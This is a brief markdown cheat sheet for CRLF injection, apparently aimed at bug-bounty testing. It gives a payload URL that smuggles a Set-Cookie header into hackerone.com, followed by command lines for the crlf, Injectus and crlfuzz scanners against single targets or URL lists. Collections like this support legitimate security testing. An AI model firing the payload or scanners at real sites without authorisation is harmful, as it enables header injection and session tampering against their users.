# ONE-LINE COMMANDs

## CRLF - Add a cookie

>Example for Requested page

```http
http://www.hackerone.com/%0D%0ASet-Cookie:mycookie=You have been Hacked
```

## CRLF-Injection-Scanner

```bash
crlf scan -u "www.hackerone.com"
```

```bash
crlf scan -i "urls.txt"
```

## Injectus

>List of URLs use -f 
```bash
python3 Injectus.py -f /path/to/urls.txt -c | tee injectcrlf.txt
```

>Single URL use -u
```bash
python3 Injectus.py -u hackerone.com -c | tee injectcrlf.txt
```

## crlfuzz

>Single URL use -u
```bash
crlfuzz -u "http://target"
```

>List of URLs use -l
```bash
crlfuzz -c 30 -l /path/to/urls.txt
```
